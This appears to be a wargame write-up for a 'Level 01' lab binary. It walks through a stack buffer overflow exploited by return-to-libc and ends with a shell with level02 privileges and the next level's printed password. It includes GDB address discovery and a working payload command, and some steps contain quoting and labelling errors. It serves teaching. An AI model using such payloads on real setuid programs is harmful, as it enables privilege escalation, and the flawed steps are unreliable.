---
sidebar_position: 3
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 🔐 Level 01

<MissionObjective 
  level="Level 01"
  target="level02 privileges"
  method="Buffer overflow exploitation"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Stack-based Buffer Overflow"
  severity="high"
  description="The binary contains a buffer overflow vulnerability where fgets() reads 100 bytes into a 16-byte buffer. This allows overwriting the saved return address on the stack to redirect execution flow."
  techniques={[
    "Buffer Overflow",
    "Return Address Overwrite", 
    "ROP Chain Construction"
  ]}
/>

## Binary Analysis

<CodeBlock 
  title="GDB Disassembly"
  command="gdb -q ./level01"
  output={`(gdb) disas main
Dump of assembler code for function main:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   ...
   [Two fgets() calls visible]
   [Logic flow with verify_user_name and verify_user_pass]
   ...`}
/>

**Key Observations:**
- Program has two `fgets()` calls for username and password input
- Second `fgets()` reads 100 bytes into a 16-byte buffer
- Classic stack-based buffer overflow vulnerability

## Vulnerability Discovery

<CodeBlock 
  title="Vulnerable Code Analysis"
  command="# In main function:"
  output={`char buffer[16];           // 16-byte buffer on stack
fgets(buffer, 100, stdin);  // Reads up to 100 bytes - OVERFLOW!`}
/>

## Finding the Offset

<CodeBlock 
  title="EIP Offset Discovery"
  command='python -c "print("dat_wil\n" + "A"*100)" > /tmp/input.txt'
  output="Creating test payload to find EIP overwrite offset"
/>

<CodeBlock 
  title="Testing with GDB"
  command="gdb ./level01"
  output={`(gdb) run < /tmp/input.txt
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax: 0x0  ebx: 0x0  ecx: 0x0  edx: 0x0
esp: 0xbffff700  ebp: 0x41414141  esi: 0x0  edi: 0x0
eip: 0x41414141  <-- EIP overwritten with 'AAAA'`}
/>

**Critical Discovery:** EIP is overwritten at offset 80 bytes!

## Address Discovery

<CodeBlock 
  title="Finding system() address"
  command="(gdb) find 0xf7e2c000, 0xf7fcc000, system"
  output={`0xf7e6aed0
(gdb) x/s 0xf7e6aed0
0xf7e6aed0: "system"`}
/>

<CodeBlock 
  title="Finding exit() address"
  command="(gdb) info functions exit"
  output={`0xf7e5eb70  exit
(gdb) x/s 0xf7e5eb70`}
/>

<CodeBlock 
  title="Finding /bin/sh string"
  command="(gdb) find 0xf7e2c000, 0xf7fcc000, /bin/sh"
  output={`0xf7f897ec
(gdb) x/s 0xf7f897ec
0xf7f897ec: "/bin/sh"`}
/>

## Live Demonstration

<AsciinemaPlayer 
  src="https://asciinema.org/a/o2F6KCbfJ4YF5a1k7eONrIQLA.js" 
  id="asciicast-o2F6KCbfJ4YF5a1k7eONrIQLA" 
/>


## Step-by-Step Exploitation

<StepsList steps={[
  {
    title: "Create the payload",
    description: "Construct buffer overflow payload with system() call",
    command: 'python -c "print("dat_wil\n" + "A"*80 + "\\\\xd0\\\\xae\\\\xe6\\\\xf7\\" + \\"\\\\x70\\\\xeb\\\\xe5\\\\xf7\\" + \\"\\\\xec\\\\x97\\\\xf8\\\\xf7\\")" > /tmp/payload',
    output: "Payload structure:\\n- dat_wil\\\\n: valid username\\n- A*80: padding to reach return address\\n- system() address: 0xf7e6aed0\\n- exit() address: 0xf7e5eb70\\n- /bin/sh string: 0xf7f897ec"
  },
  {
    title: "Execute the exploit",
    description: "Launch the binary with our payload to trigger buffer overflow",
    command: "(cat /tmp/payload; cat) | ./level01",
    output: "$ # Shell obtained with level02 privileges"
  },
  {
    title: "Verify privilege escalation",
    description: "Confirm we have successfully escalated to level02",
    command: "whoami",
    output: "level02"
  },
  {
    title: "Access the password",
    description: "Retrieve the password for the next level",
    command: "cat /home/users/level02/.pass",
    output: "PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv"
  }
]} />

## Payload Breakdown

<CodeBlock 
  title="Exploit Structure"
  command="# Payload components:"
  output={`Username: "dat_wil\\\\n"        # Valid username (required)
Padding:  "A" * 80            # Fill buffer up to return address
RET:      0xf7e6aed0          # system() function address  
ARG1:     0xf7e5eb70          # exit() as return address
ARG2:     0xf7f897ec          # "/bin/sh" string address

Stack layout after overflow:
[buffer][padding][system][exit]["/bin/sh"]
                   ^RET   ^ARG1  ^ARG2`}
/>

## Key Takeaways

- **Buffer bounds checking** is critical - never read more data than buffer can hold
- **Stack layout understanding** is essential for precise return address overwriting
- **Dynamic address resolution** using GDB is necessary due to ASLR/library loading
- **ROP chain construction** allows calling functions with arguments via stack manipulation
- **Username validation bypass** - program accepts specific usernames like "dat_wil"

**Tools used:** `gdb`, `python`, buffer overflow techniques, address discovery, ROP chains

:::warning Important Notes
- Addresses may change between runs due to ASLR - always verify addresses before exploitation
- The offset (80 bytes) is specific to this binary's stack layout
- Valid username is required to reach the vulnerable password input function
:::

:::tip Exploitation Method
This classic buffer overflow overwrites the return address to redirect execution to `system("/bin/sh")`, effectively gaining a shell with the target user's privileges.
::: 